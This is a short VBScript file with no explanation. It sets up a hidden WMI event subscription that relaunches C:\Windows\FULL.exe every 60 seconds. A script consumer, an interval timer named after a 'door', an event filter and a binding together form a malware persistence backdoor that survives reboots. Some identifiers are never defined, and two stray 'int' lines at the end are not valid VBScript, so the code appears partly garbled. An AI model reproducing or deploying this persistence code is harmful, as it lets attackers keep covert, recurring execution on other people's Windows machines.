SET WshShell=Wscript.CreateObject("Wscript.Shell")
SET WshSysEnv=WshShell.Environment("Process") 
sysdir = WshSysEnv.Item("SYSTEMROOT") 
sysdir2 = mid(sysdir,1,3)
nslink="winmgmts:\\.\root\subscription:"
doorname="msoecj"
runinterval = 60000
stxt="Set objShell = CreateObject(""Wscript.Shell""):objShell.Run ""C:\\Windows\\FULL.exe"""
SET asec=getobject(nslink&"ActiveScriptEventConsumer").spawninstance_
asec.name=consumer_dol
asec.scriptingengine="vbscript"
asec.scripttext=stxt
SET asecpath=asec.put_
SET itimer=getobject(nslink&"__IntervalTimerInstruction").spawninstance_
itimer.timerid=doorname&"_itimer"
itimer.intervalbetweenevents=runinterval
itimer.skipifpassed=false
itimer.put_
SET evtflt=getobject(nslink&"__EventFilter").spawninstance_
evtflt.name=filter_gfl
evtflt.query="select * from __timerevent where timerid="""&doorname&"_itimer"""
evtflt.querylanguage="wql"
SET fltpath=evtflt.put_
SET fcbnd=getobject(nslink&"__FilterToConsumerBinding").spawninstance_
fcbnd.consumer=asecpath.path
fcbnd.filter=fltpath.path
fcbnd.put_
int 2441531
int 182962